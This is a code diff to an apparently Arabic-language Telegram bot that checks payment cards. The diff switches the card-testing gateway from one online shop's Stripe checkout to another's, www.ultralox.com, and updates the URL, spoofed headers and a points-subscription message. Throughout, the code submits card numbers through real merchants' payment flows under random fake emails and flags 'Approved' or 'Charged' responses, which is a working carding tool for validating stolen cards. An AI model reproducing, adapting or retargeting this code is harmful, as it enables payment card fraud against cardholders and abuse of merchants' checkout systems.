@@ -206,8 +206,11 @@ mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start")
 # كلمات الـ Approved
 APPROVED_KEYWORDS = ['APPROVED', 'Charged', 'succeeded', 'success":true']
 
-# ==================== دالة الفحص (بوابة shop.mederikoi.com) ====================
+# ==================== دالة الفحص (بوابة www.ultralox.com) ====================
 def stripe_checker(ccx):
+    """
+    فحص بطاقة باستخدام تدفق Stripe من موقع www.ultralox.com
+    """
     r = requests.Session()
     
     ccx = ccx.strip()
@@ -222,13 +225,13 @@ def stripe_checker(ccx):
     if "20" in yy:
         yy = yy.split("20")[1]
 
-    url = "https://shop.mederikoi.com/my-account/"
+    url = "https://www.ultralox.com/my-account/"
     pa = urlparse(url)
     urll = f"{pa.scheme}://{pa.netloc}"
     email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
     
     headers = {
-        'authority': 'shop.mederikoi.com',
+        'authority': 'www.ultralox.com',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
@@ -275,7 +278,7 @@ def stripe_checker(ccx):
         payment_id = response.json()['id']
         
         headers_ajax = {
-            'authority': 'shop.mederikoi.com',
+            'authority': 'www.ultralox.com',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
@@ -858,7 +861,7 @@ def my_points_command(message):
     if has_active_subscription(user_id):
         expiry = load_subscriptions().get(str(user_id), "غير معروف")
         points = get_points(user_id)
-        bot.reply_to(message, f"💰 لديك اشتراك نشط حتى {expiry}\n📊 نقاطك المحفوظة: {points} نقطة")
+        bot.reply_to(message, f"💰 لديك اشتراك نشط حتى {expiry}\n📊 نقاطك المحفوظة: {points} نقطة\n💡 ملاحظة: أثناء الاشتراك لا تستهلك نقاطك")
     else:
         points = get_points(user_id)
         bot.reply_to(message, f"💰 رصيدك الحالي: {points} نقطة")
